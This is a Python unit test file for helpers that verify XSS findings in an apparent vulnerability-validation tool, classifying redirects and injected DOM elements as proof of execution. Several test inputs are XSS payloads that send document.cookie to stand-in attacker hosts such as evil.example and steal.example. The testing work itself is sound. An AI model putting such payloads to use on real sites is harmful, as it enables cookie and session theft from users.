"""
Unit tests for the pure XSS-execution helpers extracted from _validate_xss.

The browser driver itself needs chromium (covered by the e2e flow test); these
tests exercise the decision logic that classifies observed navigations and DOM
elements as proof, without a browser.
"""

from __future__ import annotations

from dast.hackerone.xss_browser import (
    XssBrowserRun,
    build_payload_needles,
    is_injected_element,
    match_exfil_navigation,
    observed_execution_mechanism,
    payload_exfil_hosts,
    payload_reflected_in_dom,
)


class TestPayloadExfilHosts:
    def test_extracts_attacker_host_from_redirect_payload(self):
        payload = "javascript:location='https://evil.example?'+document.cookie"
        assert "evil.example" in payload_exfil_hosts(payload, "http://target.com/x")

    def test_excludes_target_own_origin(self):
        payload = "javascript:location='https://target.com/x'"
        assert payload_exfil_hosts(payload, "http://target.com/x") == set()

    def test_ignores_common_cdn_hosts(self):
        payload = "load https://www.google-analytics.com/collect"
        assert payload_exfil_hosts(payload, "http://target.com/x") == set()

    def test_no_hosts_for_alert_only_payload(self):
        assert payload_exfil_hosts("<script>alert(1)</script>", "http://target.com/x") == set()

    def test_reads_host_from_proof_url_query(self):
        proof = "http://target.com/?url=javascript:top.location='https://evil.example'"
        assert "evil.example" in payload_exfil_hosts("", proof)


class TestMatchExfilNavigation:
    def test_exact_match(self):
        assert match_exfil_navigation(["evil.example"], {"evil.example"}) == "evil.example"

    def test_www_variant_matches(self):
        assert match_exfil_navigation(["www.evil.example"], {"evil.example"}) == "www.evil.example"

    def test_no_match_returns_empty(self):
        assert match_exfil_navigation(["target.com"], {"evil.example"}) == ""


class TestBuildPayloadNeedles:
    def test_short_payload_ignored(self):
        assert build_payload_needles("abc") == set()

    def test_long_payload_kept_with_decoded_variant(self):
        needles = build_payload_needles("javascript%3Aalert(1)")
        assert "javascript%3Aalert(1)" in needles
        assert "javascript:alert(1)" in needles


class TestIsInjectedElement:
    def test_javascript_href_is_injection(self):
        assert is_injected_element("javascript:alert(1)", {}, set(), set()) is True

    def test_native_control_not_injection(self):
        attrs = {"onclick": "location='https://app.example/delete'"}
        assert is_injected_element("", attrs, set(), set()) is False

    def test_element_carrying_payload_needle_is_injection(self):
        needles = {"top.location='https://steal.example"}
        attrs = {"onclick": "top.location='https://steal.example/?c='+document.cookie"}
        assert is_injected_element("", attrs, needles, set()) is True

    def test_element_carrying_exfil_host_is_injection(self):
        attrs = {"onmouseover": "fetch('https://evil.example')"}
        assert is_injected_element("", attrs, set(), {"evil.example"}) is True


class TestPayloadReflectedInDom:
    def test_raw_reflected(self):
        assert payload_reflected_in_dom("<script>x</script>", "<p><script>x</script></p>") is True

    def test_decoded_reflected(self):
        assert payload_reflected_in_dom("%3Cscript%3E", "<div><script></div>") is True

    def test_not_reflected(self):
        assert payload_reflected_in_dom("<script>", "clean page") is False

    def test_empty_payload(self):
        assert payload_reflected_in_dom("", "anything") is False


class TestObservedExecutionMechanism:
    def test_dialog_wins(self):
        run = XssBrowserRun(alert_fired=True, exfil_navigation="evil.example")
        assert observed_execution_mechanism(run) == "dialog"

    def test_redirect(self):
        run = XssBrowserRun(exfil_navigation="evil.example")
        assert observed_execution_mechanism(run) == "redirect"

    def test_reflected_alert(self):
        run = XssBrowserRun(payload_in_dom=True, page_content="<script>alert(1)</script>")
        assert observed_execution_mechanism(run) == "reflected_alert"

    def test_reflected_without_alert_is_none(self):
        run = XssBrowserRun(payload_in_dom=True, page_content="<b>reflected but escaped</b>")
        assert observed_execution_mechanism(run) == ""

    def test_nothing_observed(self):
        assert observed_execution_mechanism(XssBrowserRun()) == ""
